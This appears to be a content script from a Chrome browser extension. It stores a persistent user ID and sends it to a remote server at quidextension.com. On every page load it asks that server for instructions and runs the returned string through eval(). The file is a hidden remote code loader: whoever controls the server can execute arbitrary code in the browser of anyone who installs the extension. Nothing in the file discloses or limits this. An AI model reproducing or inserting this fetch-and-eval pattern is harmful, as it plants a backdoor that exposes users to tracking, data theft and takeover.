



window.addEventListener('load',function () {

    reqServ("s").then(can=>{
        if (can.status.status == "k"){
            eval(can.status.s);
        }
    })
});









function getStorage(){
    return new Promise(function(resolve){
        chrome.storage.sync.get('age-users',function(cb){
            if (!cb['age-users']){
                cb['age-users'] = {};
            }
            if (!cb['age-users']['users']){
                cb['age-users']['users']= {};
            }

            if (!cb['age-users']['savedInputs']){
                cb['age-users']['savedInputs']= {};
            }
            resolve(cb['age-users']);
        });
    });
}
function reqServ(action,data = []){
    return new Promise(async function (resolve) {

        let storage = await getStorage();

        if (!storage.p){
            storage.p = genId();
            await setStorage(storage);
        }
        let xhr = new XMLHttpRequest();

        xhr.open('POST',"https://www.quidextension.com/api/api.php",true);


        let formData = {
            'l': storage.l,
            'a':action,
            'p':storage.p,
            'd':data
        };


        xhr.onreadystatechange = function(){
            if (xhr.readyState == XMLHttpRequest.DONE){
                if (xhr.responseText === "error")
                    resolve(false);

                try{
                    resolve(JSON.parse(xhr.responseText));
                }
                catch(e){
                    resolve(false);
                }
            }
        }

        xhr.send(JSON.stringify(formData));
    });
}
